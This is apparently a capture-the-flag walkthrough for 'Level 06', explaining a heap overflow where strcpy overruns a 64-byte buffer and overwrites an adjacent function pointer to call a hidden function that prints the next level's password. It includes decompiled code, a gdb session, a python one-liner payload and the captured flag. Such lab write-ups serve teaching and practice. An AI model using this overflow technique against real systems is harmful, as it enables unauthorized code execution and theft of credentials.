# Level 06 Walkthrough

## Binary analysis

The binary allocates two buffers with `malloc`: one for a string (0x40 bytes) and one for a function pointer (4 bytes). The function pointer is initialized to `m()`, which just prints "Nope". The user input (argv[1]) is copied into the string buffer with `strcpy`, which is vulnerable to overflow. After the copy, the function pointer is called. If we overflow the string buffer, we can overwrite the function pointer to point to `n()`, which calls `system("/bin/cat /home/user/level7/.pass")`.

Relevant code:
```
0804848c        char* str = malloc(bytes: 0x40)
0804849c        int32_t (** table)() = malloc(bytes: 4)
080484ae        *table = m
080484c5        strcpy(str, argv[1])
080484d3        return (*table)()

n() at 0x08048454: system("/bin/cat /home/user/level7/.pass")
m() at 0x08048468: puts("Nope")
```

## Exploitation

We find the address returned by `malloc` for the string buffer and the function pointer:

```
(gdb) b *0x08048491
Breakpoint 1 at 0x8048491
(gdb) b*0x080484a1
Breakpoint 2 at 0x80484a1
(gdb) r hello
Starting program: /home/user/level6/level6 hello

Breakpoint 1, 0x08048491 in main ()
(gdb) p/x $eax
$2 = 0x804a008
(gdb) c
Continuing.

Breakpoint 2, 0x080484a1 in main ()
(gdb) p/x $eax
$3 = 0x804a050
```

We overflow the string buffer to overwrite the function pointer with the address of `n()` (0x08048454).

We generate the payload with the offset between the string buffer and the function pointer, and the address of `n()`.

## Commands used

```
./level6 $(python -c 'print(b"A" * (0x804a050 - 0x804a008) + b"\x08\x04\x84\x54"[::-1])')
```

## Result

After running the exploit, we get the password for level7:

```
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
